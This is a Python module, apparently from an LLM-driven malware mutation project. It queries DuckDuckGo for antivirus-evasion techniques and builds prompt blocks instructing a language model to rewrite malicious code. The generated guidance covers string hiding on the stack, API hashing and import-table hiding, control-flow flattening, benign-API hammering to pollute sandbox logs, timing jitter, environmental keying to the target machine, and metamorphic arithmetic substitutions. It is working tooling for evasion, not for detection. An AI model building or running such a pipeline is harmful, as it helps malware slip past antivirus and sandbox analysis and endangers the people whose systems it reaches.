"""
Evasion Research Module
========================
Uses DuckDuckGo search API to dynamically discover current AV evasion
techniques, then distills them into actionable prompt fragments that
enrich the static strategy prompts in utility_prompt_library.py.

The module caches results to avoid hammering the search API on every
mutation cycle.  Cache TTL is configurable (default 6 hours).
"""

import hashlib
import json
import logging
import os
import time
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Search queries per strategy — each returns technique-oriented results
# ---------------------------------------------------------------------------

_SEARCH_QUERIES: dict[str, list[str]] = {
    # strat_1: String & Constant Obfuscation + Dead Code Injection
    "strat_1": [
        "malware string obfuscation stack construction per-character assignment antivirus bypass 2025",
        "AV evasion dead code injection entropy change volatile junk computation technique",
        "anti-heuristic string building varied techniques low entropy static analysis bypass",
    ],
    # strat_2: Control Flow Flattening + Opaque Predicates + API Hammering + String Elimination
    "strat_2": [
        "control flow flattening state machine AV evasion opaque predicates CFG bypass 2025",
        "string literal elimination stack construction combined control flow obfuscation antivirus",
        "API hammering dead code benign Win32 calls behavioral analysis sandbox evasion 2025",
    ],
    # strat_3: All String Elimination + Dynamic API Resolution + CRT Substitution + API Hashing
    "strat_3": [
        "dynamic API resolution GetProcAddress string elimination combined AV evasion 2025",
        "API hashing export table walk import table obfuscation string hiding malware technique",
        "stack string construction GetProcAddress LoadLibrary IAT hiding combined bypass",
    ],
    # strat_4: Function Splitting + String Elimination in ALL helpers + Variable Renaming
    "strat_4": [
        "function splitting string obfuscation combined AV evasion call graph transformation 2025",
        "code chunking variable renaming local variable obfuscation signature bypass antivirus",
        "helper function extraction stack string construction metamorphic malware technique",
    ],
    # strat_5: String Elimination (P1) + CRT Substitution (P2) + Arithmetic Obfuscation (P3) + Variable Renaming (P4)
    "strat_5": [
        "string literal elimination priority AV evasion stack construction semantic substitution 2025",
        "CRT replacement manual implementation combined string hiding bypass static signature",
        "instruction substitution arithmetic identity multi-layer metamorphic malware 2025",
    ],
    # strat_6: API Hammering + Timing Jitter + Environmental Keying + String Elimination
    "strat_6": [
        "API hammering string literal elimination combined sandbox evasion behavioral analysis 2025",
        "environmental keying context-aware malware anti-sandbox string obfuscation technique",
        "timing jitter GetTickCount anti-sandbox string hiding combined AV bypass 2025",
    ],
    # strat_all: All techniques combined — string hiding + dynamic API + semantic sub + behavioral noise + var rename
    "strat_all": [
        "combined malware evasion string obfuscation dynamic API resolution behavioral noise 2025",
        "multi-layer AV bypass string hiding variable renaming semantic substitution anti-sandbox",
        "advanced antivirus bypass stack string construction GetProcAddress control flow combined",
    ],
}

# Technique keywords we look for in search results to extract actionable ideas
_TECHNIQUE_KEYWORDS = [
    "stack string", "stack-built", "compile-time", "constexpr",
    "XOR", "RC4", "AES", "encrypt", "decrypt", "encode", "decode",
    "GetProcAddress", "LoadLibrary", "LdrGetProcedureAddress",
    "NtAllocateVirtualMemory", "syscall", "indirect syscall",
    "control flow", "flattening", "dispatcher", "state machine",
    "opaque predicate", "dead code", "junk code", "bogus",
    "API hashing", "hash-based", "djb2", "crc32", "ror13",
    "metamorphic", "polymorphic", "mutation engine",
    "IAT", "import address table", "import hiding",
    "anti-sandbox", "anti-VM", "anti-debug", "anti-analysis",
    "timing", "sleep", "NtDelayExecution", "delay",
    "environmental keying", "context-aware",
    "entropy", "high entropy", "low entropy",
    "section", "PE section", ".text", ".data", ".rdata",
    "callback", "TLS callback", "DLL_PROCESS_ATTACH",
    "shellcode", "position independent",
    "ETW", "AMSI", "unhooking", "patching",
    "function splitting", "outlining", "chunking",
    "arithmetic identity", "bitwise equivalent",
    "API hammering", "benign API", "noise",
]


def _get_cache_path() -> Path:
    cache_dir = Path(os.environ.get(
        "LLMALMORPH_CACHE_DIR",
        Path(__file__).resolve().parent.parent / "work" / ".evasion_cache"
    ))
    cache_dir.mkdir(parents=True, exist_ok=True)
    return cache_dir


def _cache_key(strategy: str, language: str) -> str:
    raw = f"{strategy}:{language}"
    return hashlib.md5(raw.encode()).hexdigest()


def _load_cache(strategy: str, language: str, ttl_seconds: int = 21600) -> Optional[str]:
    cache_file = _get_cache_path() / f"{_cache_key(strategy, language)}.json"
    if not cache_file.exists():
        return None
    try:
        data = json.loads(cache_file.read_text(encoding="utf-8"))
        if time.time() - data.get("ts", 0) < ttl_seconds:
            return data.get("enrichment", "")
    except Exception:
        pass
    return None


def _save_cache(strategy: str, language: str, enrichment: str, meta: Optional[dict] = None) -> None:
    cache_file = _get_cache_path() / f"{_cache_key(strategy, language)}.json"
    try:
        payload: dict = {
            "ts": time.time(),
            "enrichment": enrichment,
            "strategy": strategy,
            "language": language,
        }
        if meta:
            payload.update(meta)
        cache_file.write_text(json.dumps(payload), encoding="utf-8")
    except Exception as e:
        logger.warning("evasion_cache_write_failed: %s", e)


def _ddg_available() -> bool:
    """Return True if a DuckDuckGo search package is importable."""
    try:
        import ddgs  # noqa: F401
        return True
    except ImportError:
        pass
    try:
        import duckduckgo_search  # noqa: F401
        return True
    except ImportError:
        pass
    return False


def _search_ddg(query: str, max_results: int = 8) -> list[dict]:
    """Run a DuckDuckGo text search. Returns list of {title, body, href}."""
    try:
        try:
            from ddgs import DDGS
        except ImportError:
            from duckduckgo_search import DDGS  # type: ignore[no-redef]
        with DDGS() as ddgs:
            results = list(ddgs.text(query, max_results=max_results))
        return results
    except ImportError:
        # Package not installed — log once at WARNING level
        logger.warning(
            "ddg_search_unavailable: neither 'ddgs' nor 'duckduckgo_search' is installed. "
            "Install one of them to enable dynamic evasion research enrichment."
        )
        return []
    except Exception as e:
        logger.warning("ddg_search_failed query=%r: %s", query[:60], e)
        return []


def _extract_techniques(results: list[dict]) -> list[str]:
    """Extract technique mentions from search result snippets."""
    techniques = set()
    for r in results:
        text = (r.get("body", "") + " " + r.get("title", "")).lower()
        for kw in _TECHNIQUE_KEYWORDS:
            if kw.lower() in text:
                techniques.add(kw)
    return sorted(techniques)


# Techniques that conflict with specific strategies and must be suppressed
# to avoid contradicting the static prompt rules.
_STRATEGY_BLOCKED_TECHNIQUES: dict[str, set[str]] = {
    # strat_1 explicitly bans XOR loops (trigger AV heuristics) and high-entropy crypto
    "strat_1": {"XOR", "RC4", "AES", "encrypt", "decrypt", "high entropy",
                "syscall", "indirect syscall", "ETW", "AMSI", "unhooking", "patching"},
    # strat_2: no NT-layer APIs (validator rejects them); no high-entropy crypto
    "strat_2": {"syscall", "indirect syscall", "NtDelayExecution", "ETW", "AMSI",
                "unhooking", "patching", "XOR", "RC4", "AES", "encrypt", "decrypt"},
    # strat_3: no NT-layer syscalls (Gate 3g rejects); no high-entropy in-place crypto
    "strat_3": {"syscall", "indirect syscall", "ETW", "AMSI", "unhooking", "patching",
                "XOR", "RC4", "AES"},
    # strat_4: no NT-layer; no crypto that conflicts with low-entropy goal
    "strat_4": {"syscall", "indirect syscall", "ETW", "AMSI", "unhooking", "patching",
                "XOR", "RC4", "AES", "encrypt", "decrypt"},
    # strat_5 explicitly bans NT-layer API substitution; bans XOR loops (same as strat_1)
    "strat_5": {"syscall", "indirect syscall", "NtDelayExecution", "ETW", "AMSI",
                "unhooking", "patching", "XOR", "RC4", "AES"},
    # strat_6: no NT-layer (validator); no crypto
    "strat_6": {"syscall", "indirect syscall", "ETW", "AMSI", "unhooking", "patching",
                "XOR", "RC4", "AES", "encrypt", "decrypt"},
    # strat_all bans XOR loops; no NT-layer
    "strat_all": {"XOR", "RC4", "AES", "syscall", "indirect syscall",
                  "ETW", "AMSI", "unhooking", "patching"},
}


def _build_enrichment(strategy: str, language: str, techniques: list[str], snippets: list[str]) -> str:
    """Build a concise prompt enrichment block from discovered techniques."""
    if not techniques and not snippets:
        return ""

    # Remove techniques that conflict with the static prompt rules for this strategy
    blocked = _STRATEGY_BLOCKED_TECHNIQUES.get(strategy, set())
    techniques = [t for t in techniques if t not in blocked]

    lang_label = {"c": "C", "cpp": "C++", "python": "Python", "javascript": "JavaScript"}.get(language, "C")

    lines = [
        f"\n--- DYNAMIC EVASION INTELLIGENCE (auto-researched, {lang_label}) ---",
        "Recent AV evasion research highlights these additional techniques you SHOULD consider:",
    ]

    # Group techniques by category
    categories = {
        "String Protection": ["stack string", "stack-built", "compile-time", "constexpr", "encode", "decode"],
        "API Hiding": ["GetProcAddress", "LoadLibrary", "API hashing", "hash-based", "djb2", "crc32", "ror13",
                       "IAT", "import address table", "import hiding", "LdrGetProcedureAddress"],
        "Control Flow": ["control flow", "flattening", "dispatcher", "state machine",
                         "opaque predicate", "dead code", "junk code", "bogus"],
        "Anti-Analysis": ["anti-sandbox", "anti-VM", "anti-debug", "anti-analysis",
                          "timing", "sleep", "delay",
                          "environmental keying", "context-aware"],
        "Encryption": ["encrypt", "decrypt"],
        "Code Morphing": ["metamorphic", "polymorphic", "mutation engine",
                          "function splitting", "outlining", "chunking",
                          "arithmetic identity", "bitwise equivalent"],
        "Noise/Hammering": ["API hammering", "benign API", "noise"],
        "Binary": ["entropy", "low entropy",
                   "section", "PE section", ".text", ".data", ".rdata",
                   "callback", "TLS callback", "DLL_PROCESS_ATTACH",
                   "shellcode", "position independent"],
    }

    relevant_cats = {}
    for cat, keywords in categories.items():
        found = [t for t in techniques if t.lower() in [k.lower() for k in keywords]]
        if found:
            relevant_cats[cat] = found

    for cat, found_techs in relevant_cats.items():
        lines.append(f"  [{cat}]: {', '.join(found_techs)}")

    # Add strategy-specific actionable guidance based on what was found
    lines.append("")
    lines.extend(_strategy_specific_guidance(strategy, language, techniques))

    # Add up to 3 concise research snippets
    if snippets:
        lines.append("")
        lines.append("Research context (for your reference, apply judiciously):")
        for snip in snippets[:3]:
            # Truncate and clean each snippet
            clean = snip.strip().replace("\n", " ")[:200]
            if clean:
                lines.append(f"  - {clean}")

    lines.append("--- END DYNAMIC INTELLIGENCE ---\n")
    return "\n".join(lines)


def _strategy_specific_guidance(strategy: str, language: str, techniques: list[str]) -> list[str]:
    """Generate actionable guidance lines based on strategy + discovered techniques."""
    guidance = []

    if strategy in ("strat_1", "strat_all"):
        if any(t in techniques for t in ["stack string", "stack-built"]):
            guidance.append(
                "- CONFIRMED: Stack-built strings remain one of the most effective techniques. "
                "Modern AV still struggles with per-character mov-byte patterns."
            )
        if any(t in techniques for t in ["compile-time", "constexpr"]):
            guidance.append(
                "- Consider compile-time string construction using arithmetic expressions "
                "that resolve at compile time but look like normal initialization."
            )
        if "entropy" in techniques or "low entropy" in techniques:
            guidance.append(
                "- IMPORTANT: Keep string construction code LOW ENTROPY. Avoid patterns that "
                "create high-entropy byte sequences — AV flags sections with unusual entropy."
            )

    if strategy in ("strat_2",):
        if "API hammering" in techniques or "benign API" in techniques or "noise" in techniques:
            guidance.append(
                "- API HAMMERING: Scatter REAL benign Win32 API calls throughout state machine cases "
                "(GetSystemTime, GetComputerNameA, GetUserNameA, GetCurrentDirectoryA, "
                "GetSystemDirectoryA, GetTempPathA) — these execute for real, polluting sandbox logs."
            )
        if any(t in techniques for t in ["anti-sandbox", "anti-VM", "timing"]):
            guidance.append(
                "- TIMING JITTER: Add GetTickCount()-based delays between state transitions: "
                "`volatile DWORD _t0 = GetTickCount(); while(GetTickCount() - _t0 < 1) {}`  "
                "This adds microsecond noise that confuses timing-based sandbox detection."
            )
        if any(t in techniques for t in ["stack string", "stack-built", "encode", "decode"]):
            guidance.append(
                "- STRING ELIMINATION (Technique 5 is MANDATORY): Every string literal MUST become "
                "stack-built. Even short strings in dead branches must be per-character assigned. "
                "String literals inside opaque predicate dead branches are still scanned by AV."
            )

    if strategy in ("strat_3", "strat_all"):
        if any(t in techniques for t in ["API hashing", "hash-based", "djb2", "crc32", "ror13"]):
            guidance.append(
                "- API HASHING: Instead of building API name strings, consider computing a hash "
                "(e.g. djb2 or ror13) of the API name and walking the export table to find a match. "
                "This eliminates API name strings entirely from the binary. "
                "However, only use this if the function is complex enough to justify the extra code."
            )
        if any(t in techniques for t in ["IAT", "import hiding"]):
            guidance.append(
                "- IAT HIDING: GetProcAddress resolution at runtime means the API won't appear "
                "in the PE import table. This defeats import-table-based scanning."
            )
        if any(t in techniques for t in ["stack string", "stack-built", "encode", "decode"]):
            guidance.append(
                "- STRING ELIMINATION FIRST: Apply Step 1 (all string literals → stack-built) "
                "BEFORE dynamic API resolution. This ensures DLL/API name strings are also "
                "stack-built, not just data strings."
            )

    if strategy in ("strat_4",):
        if any(t in techniques for t in ["stack string", "stack-built", "encode", "decode"]):
            guidance.append(
                "- STRING ELIMINATION IN ALL HELPERS: After splitting, apply stack-built string "
                "construction to EVERY helper function, not just the main dispatcher. "
                "Each helper is analyzed independently by AV — strings in helpers are signatures too."
            )
        if any(t in techniques for t in ["metamorphic", "mutation engine", "polymorphic"]):
            guidance.append(
                "- VARIABLE RENAMING: Rename local variables in ALL helpers to bland names (_v0, _v1, _t0). "
                "Call-graph transformation alone doesn't defeat ML-based scanners that analyze "
                "variable name patterns and naming conventions."
            )

    if strategy in ("strat_5",):
        if any(t in techniques for t in ["stack string", "stack-built", "encode", "decode"]):
            guidance.append(
                "- STRING ELIMINATION IS PRIORITY 1: Apply string elimination BEFORE all other "
                "substitutions. Even a 100%% arithmetic/CRT substitution rate won't evade AV if "
                "plaintext strings remain. String literals are the #1 static signature source."
            )
        if any(t in techniques for t in ["arithmetic identity", "bitwise equivalent"]):
            guidance.append(
                "- EXTENDED ARITHMETIC: Consider these additional identities: "
                "`a - b → a + (~b) + 1`, `~a → -a - 1`, `a ^ b → (a | b) & ~(a & b)`, "
                "`a | b → (a ^ b) | (a & b)`. Mix multiple levels of substitution."
            )
        if any(t in techniques for t in ["metamorphic", "mutation engine"]):
            guidance.append(
                "- METAMORPHIC DEPTH: Apply substitutions RECURSIVELY — e.g., first replace "
                "strcmp with manual loop, then replace the loop's increment with bitwise equivalent. "
                "Multiple layers defeat pattern matching at different granularities."
            )

    if strategy in ("strat_6",):
        if any(t in techniques for t in ["API hammering", "benign API", "noise"]):
            guidance.append(
                "- Prioritize calling APIs that produce VISIBLE side effects in sandbox logs "
                "but are harmless: CreateMutexA, OpenMutexA, GetVersionExA, GlobalMemoryStatusEx, "
                "GetDiskFreeSpaceExA, GetSystemInfo, IsProcessorFeaturePresent."
            )
        if any(t in techniques for t in ["environmental keying", "context-aware"]):
            guidance.append(
                "- ENVIRONMENTAL KEYING: Use GetComputerNameA() result as a decryption key component. "
                "Code only works on the target machine — sandboxes get wrong key, wrong behavior."
            )
        if any(t in techniques for t in ["stack string", "stack-built", "encode", "decode"]):
            guidance.append(
                "- STRING ELIMINATION (Technique 4 is MANDATORY): ALL strings added by "
                "API Hammering/Timing/Environmental techniques MUST also be stack-built. "
                "Adding plaintext strings like \"C:\\\\Windows\\\\System32\\\\ntdll.dll\" as "
                "hammering args introduces NEW signatures while trying to evade detection."
            )

    if not guidance:
        guidance.append(
            "- Apply techniques with VARIETY — don't use the same pattern for every instance. "
            "Modern ML-based AV detects uniformity itself as suspicious."
        )

    return guidance


def research_evasion_techniques(
    strategy: str,
    language: str = "c",
    cache_ttl_s: int = 21600,
    enabled: bool = True,
) -> str:
    """
    Research current AV evasion techniques via web search and return
    a prompt enrichment block.

    Args:
        strategy: The mutation strategy (strat_1 .. strat_6, strat_all)
        language: Target language (c, cpp, python, javascript)
        cache_ttl_s: Cache TTL in seconds (default 6h)
        enabled: Set False to disable web search entirely

    Returns:
        A string block to append to the strategy prompt, or "" if
        search is disabled / fails / nothing found.
    """
    enrichment, _meta = _research_evasion_with_meta(
        strategy=strategy,
        language=language,
        cache_ttl_s=cache_ttl_s,
        enabled=enabled,
    )
    return enrichment


def _research_evasion_with_meta(
    strategy: str,
    language: str = "c",
    cache_ttl_s: int = 21600,
    enabled: bool = True,
) -> tuple[str, dict]:
    """
    Internal version of research_evasion_techniques that also returns
    metadata about the search operation.

    Returns:
        (enrichment_str, metadata) where metadata contains:
          - source: "disabled" | "cache" | "web" | "unavailable" | "empty"
          - techniques_found: int  (0 if unavailable/disabled)
          - snippets_found: int
    """
    if not enabled:
        return "", {"source": "disabled", "techniques_found": 0, "snippets_found": 0}

    # Check dependency availability before attempting cache/search
    if not _ddg_available():
        logger.warning(
            "evasion_research_unavailable: DuckDuckGo package not installed "
            "(strategy=%s). Web enrichment disabled.", strategy,
        )
        return "", {"source": "unavailable", "techniques_found": 0, "snippets_found": 0}

    cached = _load_cache(strategy, language, cache_ttl_s)
    if cached is not None:
        logger.info("evasion_research_cache_hit strategy=%s language=%s", strategy, language)
        # Count techniques in cached enrichment by counting category lines
        _cached_techs = len([ln for ln in cached.splitlines() if ln.strip().startswith("[")])
        return cached, {"source": "cache", "techniques_found": _cached_techs, "snippets_found": 0}

    queries = _SEARCH_QUERIES.get(strategy, _SEARCH_QUERIES.get("strat_all", []))
    if not queries:
        return "", {"source": "empty", "techniques_found": 0, "snippets_found": 0}

    logger.info(
        "evasion_research_searching strategy=%s language=%s num_queries=%d",
        strategy, language, len(queries),
    )

    all_results = []
    for q in queries:
        lang_q = f"{q} {language}" if language not in q else q
        results = _search_ddg(lang_q, max_results=5)
        all_results.extend(results)

    if not all_results:
        logger.warning("evasion_research_no_results strategy=%s", strategy)
        _save_cache(strategy, language, "", meta={"techniques_found": 0, "snippets_found": 0})
        return "", {"source": "web", "techniques_found": 0, "snippets_found": 0}

    techniques = _extract_techniques(all_results)
    snippets = [r.get("body", "") for r in all_results if r.get("body")]

    enrichment = _build_enrichment(strategy, language, techniques, snippets)
    meta = {"source": "web", "techniques_found": len(techniques), "snippets_found": len(snippets)}

    _save_cache(strategy, language, enrichment, meta=meta)
    logger.info(
        "evasion_research_complete strategy=%s language=%s techniques=%d snippets=%d",
        strategy, language, len(techniques), len(snippets),
    )

    return enrichment, meta
